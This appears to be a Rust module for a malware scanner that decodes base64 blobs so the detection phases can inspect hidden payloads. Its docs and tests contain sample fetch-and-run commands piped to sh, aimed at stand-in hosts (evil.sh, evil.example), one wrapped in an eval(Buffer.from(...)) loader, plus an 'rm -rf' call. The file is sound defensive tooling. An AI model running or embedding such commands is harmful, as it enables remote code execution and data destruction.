//! Derived analysis units: content that only exists after something decodes it.
//!
//! The scanner used to run its phases exactly once, over the bytes as they sat
//! on disk. That leaves a structural blind spot: for
//!
//! ```text
//! eval(Buffer.from("Y3VybCBodHRwOi8vZXZpbC5zaCB8IHNo", "base64").toString());
//! ```
//!
//! the obfuscation phase fires on the *shape* of the expression, and the
//! decoded `curl http://evil.sh | sh` — which is exactly what the install-hook,
//! exfiltration and credential phases exist to catch — is never looked at.
//! `obfuscation_chain.json` compensates by encoding common chains as single
//! regexes, but that only works when the whole chain sits on one line, and it
//! is a race against attacker variation that pattern matching loses.
//!
//! No number of additional regexes closes this. It is a property of the
//! schedule, not of the corpus.
//!
//! Ghidra's answer is that analysis is a worklist run to a fixpoint rather
//! than a fixed number of passes: an analyser that produces a new fact wakes
//! the analysers that care about that fact. Disassembling bytes creates
//! instructions, which wakes the instruction analysers, which find a function,
//! which wakes the function analysers.
//!
//! This module is the Sigil-shaped version: given the content of one analysis
//! unit, produce the units derived from it. The scan loop then runs every
//! phase over those too, to a bounded depth. Every existing phase applies to
//! decoded content for free.
//!
//! Bounds are deliberate and tight, because decoding attacker-controlled input
//! in a loop is how a scanner turns into a denial of service:
//!
//! - [`MAX_DEPTH`] limits how many times content may be decoded from decoded
//!   content (a payload nested two deep is already unusual);
//! - [`MAX_UNITS_PER_FILE`] limits the fan-out from any one file;
//! - [`MAX_DERIVED_BYTES`] limits the total decoded volume per file;
//! - candidates below [`MIN_BLOB_LEN`] are ignored, and anything that does not
//!   decode to plausible text is discarded.

use std::sync::OnceLock;

use base64::Engine as _;
use regex::Regex;

/// How many times content may be derived from already-derived content.
///
/// Depth 0 is the file on disk. Depth 2 catches a payload encoded inside an
/// encoded payload, which is where real samples stop.
pub const MAX_DEPTH: usize = 2;

/// Maximum derived units produced from a single file, across all depths.
pub const MAX_UNITS_PER_FILE: usize = 24;

/// Maximum total decoded bytes retained per file.
pub const MAX_DERIVED_BYTES: usize = 1024 * 1024;

/// Shortest base64 run considered worth decoding.
///
/// Short runs are overwhelmingly ordinary identifiers, hashes and CSS class
/// names; decoding them is pure cost and noise.
const MIN_BLOB_LEN: usize = 24;

/// One unit of content to run the phases over.
#[derive(Debug, Clone)]
pub struct DerivedUnit {
    /// Decoded text.
    pub contents: String,
    /// How the content was obtained, for the finding locator —
    /// e.g. `base64:line-3`.
    pub via: String,
    /// Line in the *parent* unit the encoded blob appeared on, so a finding
    /// in decoded content still points at a real line of a real file.
    pub parent_line: usize,
    /// Derivation depth; 1 for content decoded straight from a file.
    pub depth: usize,
}

/// Budget shared across every derivation from one file.
#[derive(Debug)]
pub struct DeriveBudget {
    units: usize,
    bytes: usize,
}

impl Default for DeriveBudget {
    fn default() -> Self {
        Self::new()
    }
}

impl DeriveBudget {
    pub fn new() -> Self {
        DeriveBudget { units: 0, bytes: 0 }
    }

    fn admit(&mut self, len: usize) -> bool {
        if self.units >= MAX_UNITS_PER_FILE || self.bytes + len > MAX_DERIVED_BYTES {
            return false;
        }
        self.units += 1;
        self.bytes += len;
        true
    }
}

fn base64_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // Standard alphabet, long runs only. Deliberately not matching the
    // URL-safe alphabet in the same pass: `-` and `_` appear constantly in
    // ordinary identifiers and would flood the candidate set.
    RE.get_or_init(|| Regex::new(r"[A-Za-z0-9+/]{24,}={0,2}").expect("static base64 regex"))
}

/// Produce the units derived from `contents`.
///
/// Returns an empty vector at or beyond [`MAX_DEPTH`], or once the budget is
/// spent.
pub fn derive_units(contents: &str, depth: usize, budget: &mut DeriveBudget) -> Vec<DerivedUnit> {
    if depth >= MAX_DEPTH {
        return Vec::new();
    }

    let mut out = Vec::new();
    let engine = base64::engine::general_purpose::STANDARD;

    for (line_idx, line) in contents.lines().enumerate() {
        // A single pathological line should not be able to dominate the budget.
        if out.len() >= MAX_UNITS_PER_FILE {
            break;
        }
        for m in base64_re().find_iter(line) {
            let blob = m.as_str();
            if blob.len() < MIN_BLOB_LEN {
                continue;
            }
            // Base64 length must be a multiple of 4 once padded; trim the run
            // to its longest decodable prefix rather than rejecting outright,
            // since the regex may have absorbed trailing characters.
            let usable = blob.len() - (blob.len() % 4);
            if usable < MIN_BLOB_LEN {
                continue;
            }
            let Ok(bytes) = engine.decode(&blob[..usable]) else {
                continue;
            };
            let Ok(text) = String::from_utf8(bytes) else {
                continue; // decoded to binary — not something the phases read
            };
            if !is_plausible_text(&text) {
                continue;
            }
            if !budget.admit(text.len()) {
                return out;
            }
            out.push(DerivedUnit {
                contents: text,
                via: format!("base64:line-{}", line_idx + 1),
                parent_line: line_idx + 1,
                depth: depth + 1,
            });
            if out.len() >= MAX_UNITS_PER_FILE {
                break;
            }
        }
    }

    out
}

/// Is this decoded output worth running rules over?
///
/// Random bytes decode to valid UTF-8 often enough that a plain UTF-8 check
/// is not sufficient. Requiring mostly-printable content keeps the derived
/// set small and the findings meaningful.
fn is_plausible_text(s: &str) -> bool {
    if s.trim().is_empty() {
        return false;
    }
    let total = s.chars().count();
    if total < 4 {
        return false;
    }
    let printable = s
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\n' | '\r' | '\t'))
        .count();
    printable * 10 >= total * 9
}

#[cfg(test)]
mod tests {
    use super::*;

    fn derive(s: &str) -> Vec<DerivedUnit> {
        derive_units(s, 0, &mut DeriveBudget::new())
    }

    /// The motivating case: the decoded payload must become scannable content.
    #[test]
    fn decodes_an_embedded_payload() {
        // "curl http://evil.example/x.sh | sh"
        let encoded =
            base64::engine::general_purpose::STANDARD.encode("curl http://evil.example/x.sh | sh");
        let src = format!("eval(Buffer.from(\"{encoded}\", \"base64\").toString());");
        let units = derive(&src);
        assert_eq!(units.len(), 1, "got {units:?}");
        assert!(units[0].contents.contains("curl http://evil.example"));
        assert_eq!(units[0].parent_line, 1);
        assert_eq!(units[0].depth, 1);
        assert_eq!(units[0].via, "base64:line-1");
    }

    #[test]
    fn reports_the_parent_line() {
        let encoded =
            base64::engine::general_purpose::STANDARD.encode("os.system('rm -rf /important')");
        let src = format!("line one\nline two\npayload = \"{encoded}\"\n");
        let units = derive(&src);
        assert_eq!(units.len(), 1);
        assert_eq!(units[0].parent_line, 3);
    }

    #[test]
    fn ignores_short_runs_and_ordinary_identifiers() {
        let src = "const alpha = someIdentifier;\nlet x = abc123;\nclass FooBarBaz {}\n";
        assert!(derive(src).is_empty(), "{:?}", derive(src));
    }

    #[test]
    fn discards_binary_decodes() {
        // Valid base64 that decodes to non-UTF-8 bytes.
        let encoded = base64::engine::general_purpose::STANDARD.encode([0xff_u8; 48]);
        let src = format!("blob = \"{encoded}\"");
        assert!(derive(&src).is_empty());
    }

    #[test]
    fn discards_control_character_soup() {
        let encoded = base64::engine::general_purpose::STANDARD
            .encode("\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x10\x11\x12\x13");
        let src = format!("blob = \"{encoded}\"");
        assert!(derive(&src).is_empty());
    }

    #[test]
    fn respects_the_depth_cap() {
        let encoded = base64::engine::general_purpose::STANDARD.encode("curl http://evil.example");
        let src = format!("x = \"{encoded}\"");
        assert!(
            derive_units(&src, MAX_DEPTH, &mut DeriveBudget::new()).is_empty(),
            "must not derive at or beyond MAX_DEPTH"
        );
    }

    #[test]
    fn respects_the_unit_cap() {
        let encoded =
            base64::engine::general_purpose::STANDARD.encode("curl http://evil.example/x.sh");
        let src = (0..200)
            .map(|i| format!("var v{i} = \"{encoded}\";"))
            .collect::<Vec<_>>()
            .join("\n");
        let units = derive(&src);
        assert!(
            units.len() <= MAX_UNITS_PER_FILE,
            "fan-out unbounded: {}",
            units.len()
        );
    }

    #[test]
    fn respects_the_byte_budget() {
        let big = "curl http://evil.example/".repeat(4000);
        let encoded = base64::engine::general_purpose::STANDARD.encode(&big);
        let src = (0..40)
            .map(|i| format!("var v{i} = \"{encoded}\";"))
            .collect::<Vec<_>>()
            .join("\n");
        let mut budget = DeriveBudget::new();
        let units = derive_units(&src, 0, &mut budget);
        let total: usize = units.iter().map(|u| u.contents.len()).sum();
        assert!(
            total <= MAX_DERIVED_BYTES,
            "decoded {total} bytes, cap is {MAX_DERIVED_BYTES}"
        );
    }

    /// Nested encoding: a payload encoded inside an encoded payload.
    #[test]
    fn derives_from_derived_content() {
        let inner =
            base64::engine::general_purpose::STANDARD.encode("curl http://evil.example/x.sh");
        let outer = base64::engine::general_purpose::STANDARD.encode(format!("eval(\"{inner}\")"));
        let src = format!("x = \"{outer}\"");

        let mut budget = DeriveBudget::new();
        let first = derive_units(&src, 0, &mut budget);
        assert_eq!(first.len(), 1);
        let second = derive_units(&first[0].contents, first[0].depth, &mut budget);
        assert_eq!(second.len(), 1, "second-level payload not derived");
        assert!(second[0].contents.contains("curl http://evil.example"));
        assert_eq!(second[0].depth, 2);
    }
}
